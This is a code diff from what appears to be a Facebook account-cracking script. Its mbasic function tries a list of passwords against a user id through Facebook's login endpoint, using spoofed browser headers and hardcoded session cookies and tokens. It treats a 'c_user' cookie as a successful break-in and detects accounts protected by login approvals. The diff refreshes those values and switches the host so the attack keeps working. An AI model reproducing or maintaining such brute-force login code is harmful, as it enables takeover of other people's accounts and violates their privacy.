@@ -1206,12 +1206,12 @@ def mbasic(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
-            data ={
+            data = {
             'email': uid,
             'cuid': '',
-            'guid': 'f745e416c188c6e42',
-            'lgnjs': '1735152901',
-            'lgnrnd': '105500_Uhni',
+            'guid': 'f7d923be260ada3ea',
+            'lgnjs': '1733767601',
+            'lgnrnd': '100640_NiY9',
             'locale': 'en_GB',
             'login_source': 'comet_login_header',
             'next': 'https://www.facebook.com/gfgd',
@@ -1226,22 +1226,21 @@ def mbasic(uid,pwx,tl):
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnbFT4.AWVoj969dlk',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnVzGp.AWUAJfrpnro',
             'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
             'ps_l': '1',
-            'ps_n': '1',
-            'wd': '1440x402',}
+            'ps_n': '1',}
             headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
+            'Origin': 'https://web.facebook.com',
             'DNT': '1',
-            'Alt-Used': 'www.facebook.com',
+            'Alt-Used': 'web.facebook.com',
             'Connection': 'keep-alive',
-            'Referer': 'https://www.facebook.com/eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTUyODY0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ^%^3D^%^3D&next',
+            'Referer': 'https://web.facebook.com/gfgd',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
@@ -1251,7 +1250,7 @@ def mbasic(uid,pwx,tl):
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
